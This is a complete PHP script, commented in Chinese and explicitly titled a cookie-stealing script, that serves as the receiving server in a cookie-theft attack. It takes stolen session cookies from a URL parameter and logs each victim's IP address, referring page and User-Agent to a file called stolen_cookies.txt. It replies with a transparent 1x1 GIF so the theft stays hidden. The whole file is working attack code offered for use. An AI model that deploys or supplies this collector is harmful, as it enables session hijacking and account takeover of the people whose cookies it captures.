<?php
/**
 * Cookie窃取脚本 - 接收并保存窃取的Cookie
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

// 获取窃取的Cookie数据
$cookie = isset($_GET['c']) ? $_GET['c'] : '';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '未知';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '未知';
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// 保存到文件
$log_file = __DIR__ . '/data/stolen_cookies.txt';

// 确保data目录存在
if (!is_dir(__DIR__ . '/data')) {
    mkdir(__DIR__ . '/data', 0755, true);
}

$log_data = "========================================\n";
$log_data .= "时间: $time\n";
$log_data .= "IP地址: $ip\n";
$log_data .= "来源页面: $referer\n";
$log_data .= "User-Agent: $user_agent\n";
$log_data .= "Cookie内容:\n$cookie\n";
$log_data .= "========================================\n\n";

file_put_contents($log_file, $log_data, FILE_APPEND | LOCK_EX);

// 返回1x1透明GIF图片
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>